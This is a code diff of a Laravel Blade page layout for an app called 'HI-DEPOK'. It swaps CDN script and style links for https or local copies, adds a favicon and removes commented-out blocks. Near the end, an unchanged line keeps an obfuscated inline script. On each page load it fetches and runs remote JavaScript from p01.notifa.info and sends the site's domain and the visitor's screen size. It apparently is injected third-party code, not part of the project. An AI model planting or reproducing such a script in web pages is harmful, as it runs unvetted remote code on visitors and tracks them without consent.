@@ -4,12 +4,10 @@
     <meta charset="UTF-8">
     <html lang="{{ app()->getLocale() }}">
     <title>{{ config('app.name', 'HI-DEPOK') }}</title>
-
-
-
+    <link rel="shortcut icon" href="{{ URL::asset('img/logo.png') }}">
 
     <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
-    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/css/select2.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.3.11/css/AdminLTE.min.css">
@@ -198,8 +196,10 @@
 @endif
 
     <!-- jQuery 3.1.1 -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    {{-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script> --}}
+    <!--<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>-->
+    <script type="text/javascript" src="{{ asset('socmed/googlelib.min.js') }}"></script>
+    <script type="text/javascript" src="{{ asset('socmed/bootstrap.min.js') }}"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/js/select2.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/icheck.min.js"></script>
 
@@ -334,22 +334,6 @@
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m0uvGEHY%2fwuN0BqaYK61Zi96eDUXPd%2ftfkPV9Hl%2fnwkVWfuuL51O%2fafvFStQrmAf7Gfzl6QDjftKwmXNAVvBI%2fsRn6MSCb%2fLxbMB0LWPGH%2bj56lH1t0aMugoaQRJ6DF2MaLq2P670GEa9UHNecFpjtFqWLaP6sUTGLM9TjJrX87xXvrkbAte2t%2bF4G242igBgK0ihZz7uW37CT5tEVS52RqTygiya%2bKG%2bW91XZwqSACuryVbxuuxNJDUVFx3rumUs5X5b2c9tzTZKHNciwTxdFt9S9WiyIkqSQuYQ8iuB6j9qD%2fpafYLV0bhdsHNmbXwo2kO212xllqKJCExFJ8m7w6Q3Y0q3m6zmwFoDMnGH8F10TRTR2TJroIWxOGblalNH6A%2favSEt0ASJkGCosxET2SdF4yy5MgQPcyA2mrWDoUEeGml%2fT14eEt%2fw0TvWgJ7ep4IhQvy3NbcoafucWMrPCln92gd6MW9Y%2frblDtDYNA5dG2fjkPMEayVuaSjpbAhfHNFrxvm5gnL7e%2bLap%2fJEUJ%2bANxHI24douRfolIw8lbYaFCH1CyGldg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 
 
-    <!-- Morris.js charts -->
-    
-
-
-    
-   {{-- ======================================================================================================================= --}}
-
-
-    <!-- tiny mce -->
-    {{-- <script src="https://cloud.tinymce.com/stable/tinymce.min.js"></script>
-    <script>tinymce.init({ selector:'textarea' });</script> --}}
-
-    <!-- AdminLTE App -->
-   
-
     @yield('scripts')
 </body>
 </html>
-
